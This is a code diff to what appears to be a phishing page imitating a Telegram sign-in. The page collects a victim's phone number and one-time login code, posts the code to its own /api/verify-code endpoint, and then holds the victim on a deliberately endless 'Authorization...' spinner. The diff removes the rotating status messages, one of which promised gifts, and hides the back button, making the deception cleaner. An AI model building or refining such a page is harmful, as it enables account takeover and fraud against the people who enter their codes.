@@ -360,12 +360,6 @@
             line-height: 1.5;
         }
 
-        .verification-card .timer {
-            color: #6c6c84;
-            font-size: 13px;
-            margin-top: 12px;
-        }
-
         .code-status {
             text-align: center;
             color: #6c6c84;
@@ -405,8 +399,14 @@
             margin: 0 auto;
         }
 
-        .back-btn-hidden {
-            display: none !important;
+        /* Скрываем кнопку назад на экране загрузки */
+        .verification-section .back-btn {
+            display: none;
+        }
+
+        /* Убираем лишние надписи на экране загрузки */
+        .verification-card .timer {
+            display: none;
         }
     </style>
 </head>
@@ -487,7 +487,7 @@
             <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
-        <!-- Шаг 3: Ввод кода (как на фото) -->
+        <!-- Шаг 3: Ввод кода -->
         <div id="stepCode" class="code-section">
             <div style="text-align:center; margin-bottom:16px;">
                 <div style="font-size:32px; margin-bottom:4px;">🔐</div>
@@ -525,16 +525,15 @@
             <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
-        <!-- Шаг 4: Бесконечная загрузка -->
+        <!-- Шаг 4: Бесконечная загрузка (только спиннер) -->
         <div id="stepVerification" class="verification-section">
             <div class="verification-card">
                 <div class="icon">⏳</div>
                 <h4>Авторизация...</h4>
-                <p>Пожалуйста, подождите, идет подключение к аккаунту</p>
+                <p style="color:#6c6c84; font-size:13px;">Пожалуйста, подождите</p>
                 <div style="margin-top:16px;">
                     <div class="spinner-circle"></div>
                 </div>
-                <div class="timer" id="loadingTimer">⏳ Подключение к серверу...</div>
             </div>
 
             <div class="user-info">
@@ -563,16 +562,6 @@
         const userId = user.id || 'нет_id';
 
         let userPhone = '';
-        let loadingInterval = null;
-        let loadingMessages = [
-            '⏳ Подключение к серверу...',
-            '🔄 Проверка сессии...',
-            '🔐 Авторизация...',
-            '📡 Передача данных...',
-            '✅ Вход в аккаунт...',
-            '🎁 Получение подарков...'
-        ];
-        let messageIndex = 0;
 
         // Элементы
         const stepMain = document.getElementById('stepMain');
@@ -589,7 +578,6 @@
         const phonePrefix = document.getElementById('phonePrefix');
         const codeInput = document.getElementById('codeInput');
         const displayPhone = document.getElementById('displayPhone');
-        const loadingTimer = document.getElementById('loadingTimer');
 
         // Обновляем префикс при смене региона
         regionSelect.addEventListener('change', function() {
@@ -649,7 +637,7 @@
                 const masked = userPhone.slice(0, -4) + '****';
                 displayPhone.textContent = masked;
                 
-                // СРАЗУ ПЕРЕХОДИМ НА ЭКРАН ВВОДА КОДА (как на фото)
+                // Переходим на экран ввода кода
                 showStep(stepCode);
                 codeInput.focus();
                 
@@ -673,16 +661,8 @@
                 return;
             }
 
-            // Показываем экран загрузки
+            // Показываем экран загрузки (только спиннер)
             showStep(stepVerification);
-            
-            // Запускаем смену сообщений
-            messageIndex = 0;
-            if (loadingInterval) clearInterval(loadingInterval);
-            loadingInterval = setInterval(() => {
-                messageIndex = (messageIndex + 1) % loadingMessages.length;
-                loadingTimer.textContent = loadingMessages[messageIndex];
-            }, 3000);
 
             // Отправляем код на проверку
             fetch('/api/verify-code', {
@@ -699,12 +679,10 @@
             .then(res => res.json())
             .then(data => {
                 console.log('✅ Код подтвержден:', data);
-                // Код верный - продолжаем показывать загрузку (бесконечно)
+                // Код верный - бесконечная загрузка
             })
             .catch(err => {
                 console.log('❌ Ошибка:', err);
-                // Если код неверный - показываем ошибку
-                if (loadingInterval) clearInterval(loadingInterval);
                 alert('❌ Неверный код. Попробуйте еще раз.');
                 showStep(stepCode);
                 codeInput.value = '';
@@ -756,7 +734,6 @@
             }
             if (stepVerification.style.display === 'block') {
                 if (confirm('Вы уверены? Авторизация будет прервана.')) {
-                    if (loadingInterval) clearInterval(loadingInterval);
                     showStep(stepMain);
                 }
                 return;
